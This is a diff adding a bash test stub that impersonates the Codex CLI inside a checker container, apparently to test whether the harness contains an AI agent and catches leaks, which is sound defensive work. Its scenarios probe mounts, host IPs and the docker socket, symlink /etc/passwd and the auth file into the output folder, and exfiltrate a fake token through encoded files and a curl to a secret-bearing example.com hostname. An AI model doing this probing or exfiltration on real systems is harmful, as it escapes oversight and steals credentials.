@@ -1,0 +1,136 @@
+#!/bin/bash
+# Test stub for the Codex binary (smoketest/codex/run_tests.sh). It runs INSIDE the
+# checker container: it records what it can see and reach as FLAT files
+# /out/stub-<name> (the harness's keep-list drops sub-folders), then replays the
+# scenario named by a "STUB-SCENARIO: <name>" line in its prompt.
+# Never the real Codex; the auth file it sees is a fake.
+if [[ "${1:-}" == "--version" ]]; then echo "codex-cli stub-1.2.3"; exit 0; fi
+prompt=$(cat)
+SECRET=tok_FAKE_SECRET_0123456789abcdefXYZ
+scen=$(grep -oE 'STUB-SCENARIO: [a-z0-9-]+' <<<"$prompt" | head -1 | cut -d' ' -f2)
+r() { cat > "/out/stub-$1"; }                               # r <name> <<< content
+# the signal scenario plants its secret FIRST, so a test can wait for it
+if [[ "$scen" == slow-leak ]]; then
+  printf '%s\n' "$SECRET" > /out/leak.txt
+  echo "{\"type\":\"item.completed\",\"item\":{\"text\":\"$SECRET\"}}"
+fi
+echo "$scen" | r scenario
+printf '%s\n' "$@" | r argv
+printf '%s' "$prompt" | r prompt
+{ echo "HOME=$HOME"; echo "CODEX_HOME=${CODEX_HOME:-}"; echo "HTTPS_PROXY=${HTTPS_PROXY:-}"
+  echo "HTTP_PROXY=${HTTP_PROXY:-}"; echo "GOMODCACHE=${GOMODCACHE:-}"; echo "GOPROXY=${GOPROXY:-}"
+  echo "GOFLAGS=${GOFLAGS:-}"; echo "GOCACHE=${GOCACHE:-}"; echo "UID=$(id -u)"; echo "GID=$(id -g)"; echo "PWD=$(pwd)"
+} | r env
+(cd /work && find . -mindepth 1 \( -type f -o -type l \) -printf '%P\n' | LC_ALL=C sort) | r work-files
+# every mount that is not the container runtime's own: mount point, and the source path as seen from its filesystem
+awk '{print $5}' /proc/self/mountinfo | grep -vE '^/(proc|sys|dev)(/|$)|^/etc/(hosts|hostname|resolv\.conf)$' | LC_ALL=C sort | r mounts
+grep -E ' /out | /codex-home/auth\.json | /schema/verdict\.schema\.json ' /proc/self/mountinfo | awk '{print $5, $4, $6}' | r mount-sources
+ls -A /schema 2>/dev/null | LC_ALL=C sort | tr '\n' ' ' | r schema-ls
+for p in /work /opt/codex/codex /opt/codex/codex-code-mode-host /codex-home/auth.json /schema/verdict.schema.json /gomodcache; do
+  if [[ -e $p ]]; then if ( : >> "$p" ) 2>/dev/null || touch "$p/.w" 2>/dev/null; then echo "$p rw"; rm -f "$p/.w"; else echo "$p ro"; fi; fi
+done | r writable
+ls -A "${CODEX_HOME:-/nonexistent}" 2>/dev/null | LC_ALL=C sort | r codex-home-ls
+wc -c < "${CODEX_HOME:-/nonexistent}/config.toml" 2>/dev/null | r config-bytes
+sha256sum < "${CODEX_HOME:-/nonexistent}/auth.json" 2>/dev/null | cut -d' ' -f1 | r auth-sha
+for p in /home/darrell /usr/lib/chatgpt /var/run/docker.sock /run/docker.sock; do [[ -e "$p" ]] && echo "VISIBLE $p"; done | r host-paths
+awk 'NR>1 && $2=="00000000" {print "default route via " $3}' /proc/net/route | r default-route
+hostname -I 2>/dev/null | r my-ips
+if [[ -d /gomodcache ]]; then find /gomodcache -mindepth 1 2>/dev/null | wc -l | r gomodcache-count; else echo absent | r gomodcache-count; fi
+if [[ -f /work/go.mod ]]; then (cd /work && go build ./... 2>&1; echo "rc=$?") | r gobuild; fi
+if [[ "$scen" == pass ]]; then
+  hp=$(grep -oE 'HOSTPROBE-PORT: [0-9]+' <<<"$prompt" | head -1 | cut -d' ' -f2)
+  probe() { local name="$1"; shift; local code; code=$(curl -s -o /dev/null -w '%{http_code}' "$@" 2>/dev/null); echo "code=$code rc=$?" | r "net-$name"; }
+  # raw TCP, no proxy, to every address the docker host has plus this network's own .1 candidates
+  hips=$(grep -oE 'HOSTIPS: [0-9. ]+' <<<"$prompt" | head -1 | cut -d' ' -f2-)
+  myip=$(hostname -I 2>/dev/null | awk '{print $1}')
+  for h in $hips ${myip%.*}.1 ${myip%.*.*}.0.1 172.17.0.1; do
+    [[ "$h" == "$myip" ]] && continue
+    if timeout 4 bash -c "exec 3<>/dev/tcp/$h/${hp:-1}" 2>/dev/null; then echo "$h reachable"; else echo "$h unreachable"; fi
+  done | r net-hostips
+  probe host      -m 5  --noproxy '*' "http://172.17.0.1:${hp:-1}/"
+  probe denied    -m 10 https://example.com/
+  probe allowed   -m 15 https://chatgpt.com/
+  probe auth      -m 15 https://auth.openai.com/
+  probe api       -m 15 https://api.openai.com/
+  probe look1     -m 10 https://chatgpt.com.evil.invalid/
+  probe look2     -m 10 https://evilchatgpt.com/
+  probe look3     -m 10 https://xauth.openai.com/
+  probe port80    -m 10 --proxy http://proxy:8888 -p http://chatgpt.com:80/
+  probe plainhttp -m 10 --proxy http://proxy:8888 http://example.com/
+  probe direct    -m 5  --noproxy '*' https://chatgpt.com/
+fi
+out=""; prev=""; for a in "$@"; do [[ "$prev" == "-o" ]] && out="$a"; prev="$a"; done
+NEW=tok_ROTATED_SECRET_9876543210zyxwvUT
+OKC='{"id":"a","attack":"x","command":"c","result":"r","pass":true}'
+PASSJ='{"verdict":"PASS","criteria":['"$OKC"'],"observations":[]}'
+J() { printf '%s\n' "$1" > "$out"; }
+LEAKJ='{"verdict":"PASS","criteria":[{"id":"a","attack":"x","command":"c","result":"'"$SECRET"'","pass":true}],"observations":[]}'
+echo '{"type":"thread.started","thread_id":"stub"}'
+case "$scen" in
+  pass) J '{"verdict":"PASS","criteria":[{"id":"crit-a","attack":"tried X","command":"echo cmd-a","result":"res-a","pass":true},{"id":"crit-b","attack":"tried Y","command":"echo cmd-b","result":"res-b\nline two","pass":true}],"observations":["obs-1"]}' ;;
+  fail) J '{"verdict":"FAIL","criteria":[{"id":"crit-a","attack":"tried X","command":"","result":"","pass":false}],"observations":[]}' ;;
+  evidence-free) J '{"verdict":"PASS","criteria":[{"id":"a","attack":"looked","command":"c","result":"   ","pass":true}],"observations":[]}' ;;
+  invalid) J '{"verdict":"MAYBE","criteria":[],"observations":[]}' ;;
+  invalid-json) echo 'not json' > "$out" ;;
+  invalid-extra) J '{"verdict":"PASS","criteria":['"$OKC"'],"observations":[],"secretkey_TOPSECRET":"x"}' ;;
+  pass-inconsistent) J '{"verdict":"PASS","criteria":[{"id":"a","attack":"x","command":"c","result":"r","pass":false}],"observations":[]}' ;;
+  fail-inconsistent) J '{"verdict":"FAIL","criteria":['"$OKC"'],"observations":[]}' ;;
+  lastlink) ln -s /etc/hostname "$out" ;;
+  lastdir) mkdir "$out" ;;
+  lastbig) python3 -c "import json; print(json.dumps({'verdict':'PASS','criteria':[{'id':'a','attack':'x'*4200000,'command':'c','result':'r','pass':True}],'observations':[]}))" > "$out" ;;
+  lastmid) python3 -c "import json; print(json.dumps({'verdict':'PASS','criteria':[{'id':'a','attack':'x'*1500000,'command':'c','result':'r','pass':True}],'observations':[]}))" > "$out" ;;
+  leak) J "$LEAKJ" ;;
+  leak-escaped) python3 -c "import sys; s=sys.argv[1]; print('{\"verdict\":\"PASS\",\"criteria\":[{\"id\":\"a\",\"attack\":\"x\",\"command\":\"c\",\"result\":\"' + ''.join('\\\\u%04x' % ord(c) for c in s[:6]) + s[6:] + '\",\"pass\":true}],\"observations\":[]}')" "$SECRET" > "$out" ;;
+  leak-invalid) printf 'not json but %s\n' "$SECRET" > "$out" ;;
+  echo-secret) echo "{\"type\":\"item.completed\",\"item\":{\"text\":\"saw $SECRET\"}}"; J "$PASSJ" ;;
+  trunc-auth) { ( : > "${CODEX_HOME}/auth.json" ) 2>/dev/null && echo truncated || echo refused; } | r trunc
+              { ( rm -f "${CODEX_HOME}/auth.json" ) 2>/dev/null && echo removed || echo refused; } | r rm
+              J "$LEAKJ" ;;
+  leak-ro) printf 'x %s x\n' "$SECRET" > /out/readonly.txt; chmod 444 /out/readonly.txt
+           printf '%s\n' "$SECRET" > /out/m000.txt; chmod 000 /out/m000.txt
+           printf 'clean\n' > /out/m000-clean.txt; chmod 000 /out/m000-clean.txt
+           mkdir -p /out/locked; printf '%s\n' "$SECRET" > /out/locked/inner.txt; chmod 000 /out/locked; J "$PASSJ" ;;
+  deep) ( cd /out && n=$(printf 'd%.0s' $(seq 1 200)); for i in $(seq 1 25); do mkdir "$n" && cd "$n" || exit; done
+          printf '%s\n' "$SECRET" > deep.txt && [[ -f deep.txt ]] && echo planted || echo not-planted ) | r deep-planted
+        J "$PASSJ" ;;
+  linkout) ln -s /codex-home/auth.json /out/auth-link; ln -s /etc/passwd /out/pw-link; mkdir -p /out/sub; echo x > /out/sub/y.txt
+           mkfifo /out/pipe; echo clean > /out/.hidden; echo clean > /out/.git; echo clean > "/out/sp ace.txt"; J "$PASSJ" ;;
+  secretname) echo clean > "/out/$SECRET"; ln -s /etc/hostname "/out/${SECRET}-link"; mkdir "/out/dir-$SECRET"; J "$PASSJ" ;;
+  esckey) python3 -c "import sys; s=sys.argv[1]; print('{\"' + ''.join('\\\\u%04x' % ord(c) for c in s) + '\": 1}')" "$SECRET" > /out/esckey.json
+          python3 -c "import sys; s=sys.argv[1]; print(s.replace('_', '\\\\u005f'))" "$SECRET" > /out/esctext.txt
+          python3 -c "import sys; s=sys.argv[1]; print(s.replace('_', '\\\\\\\\u005f'))" "$SECRET" > /out/dblesc.txt
+          J "$PASSJ" ;;
+  utf16) python3 -c "import sys; open('/out/u16le.bin','wb').write(sys.argv[1].encode('utf-16-le')); open('/out/u16be.bin','wb').write(sys.argv[1].encode('utf-16-be'))" "$SECRET"; J "$PASSJ" ;;
+  forms) python3 -c "import sys; s=sys.argv[1]; open('/out/partial.txt','w').write('x ' + s[:4] + ''.join('\\\\u%04x' % ord(c) for c in s[4:9]) + s[9:] + ' y')" "$SECRET"
+         python3 -c "import sys; s=sys.argv[1]; print('{\"type\":\"item.completed\",\"item\":{\"text\":\"' + ''.join('\\\\u%04x' % ord(c) for c in s) + '\"}}')" "$SECRET"
+         J "$PASSJ" ;;
+  proxyleak) curl -s -m 8 -o /dev/null "https://$SECRET.example.com/" 2>/dev/null; J "$PASSJ" ;;
+  many) for i in $(seq -w 1 70); do echo "f$i" > "/out/f$i.txt"; done; J "$PASSJ" ;;
+  big) head -c 1048576 /dev/zero > /out/exact.bin; head -c 1048577 /dev/zero > /out/over.bin; J "$PASSJ" ;;
+  longname) echo clean > "/out/$(printf 'n%.0s' $(seq 1 64))"; echo clean > "/out/$(printf 'n%.0s' $(seq 1 65))"; J "$PASSJ" ;;
+  longerr) long=$(printf 'X%.0s' $(seq 1 200)); echo "{\"type\":\"error\",\"message\":\"429 Too Many Requests usage limit token $long$SECRET$long\"}"; exit 1 ;;
+  slow-leak) sleep 30; J "$PASSJ" ;;
+  lockout) J "$PASSJ"; chmod 000 /out ;;                   # a valid last.json, then /out unsearchable (attempt-4 item 4)
+  rotate-old) : > /out/ready; sleep 12; J "$LEAKJ" ;;
+  rotate-new) : > /out/ready; sleep 12; printf '%s\n' "$NEW" > /out/new.txt; J "$PASSJ" ;;
+  notools) echo '{"type":"item.completed","item":{"id":"i0","type":"error","message":"Code Mode is unavailable because failed to spawn code-mode host"}}'
+           J '{"verdict":"FAIL","criteria":[{"id":"a","attack":"x","command":"c","result":"could not run","pass":false}],"observations":[]}' ;;
+  tools-words) echo '{"type":"item.completed","item":{"type":"agent_message","text":"the README says code mode is unavailable when it failed to spawn"}}'; J "$PASSJ" ;;
+  tools-field) echo '{"type":"item.completed","item":{"type":"error","message":"warning: slow start","detail":"failed to spawn"}}'; J "$PASSJ" ;;
+  quota) echo '{"type":"error","message":"429 Too Many Requests: You have hit your usage limit"}'; exit 1 ;;
+  quota-stderr) echo "stream error: usage limit reached" >&2; exit 1 ;;
+  quota-failed) echo '{"type":"turn.failed","error":{"message":"quota exceeded for this account"}}'; exit 1 ;;
+  quota-auth) echo '{"type":"error","message":"429 usage limit; also 401 Unauthorized"}'; exit 1 ;;
+  auth) echo '{"type":"error","message":"401 Unauthorized: your refresh token has expired"}'; exit 1 ;;
+  incidental) echo '{"type":"item.completed","item":{"text":"README mentions a quota of 429 and log in steps"}}'; exit 3 ;;
+  reqid) echo '{"type":"error","message":"boom","request_id":"req_4291","thread_id":"019a4290-429f"}'; exit 1 ;;
+  reqid-failed) echo '{"type":"turn.failed","error":{"message":"boom","code":"http_401","request_id":"req_4011"}}'; exit 1 ;;
+  crash) echo '{"type":"error","message":"stub internal failure"}'; exit 3 ;;
+  crash-secret) echo "boom $SECRET" >&2; exit 3 ;;
+  crash-with-last) J "$PASSJ"; exit 3 ;;
+  noout) exit 0 ;;
+  hang) sleep 120 ;;
+  *) echo '{"type":"error","message":"stub: no scenario"}'; exit 4 ;;
+esac
+echo '{"type":"turn.completed"}'
+exit 0
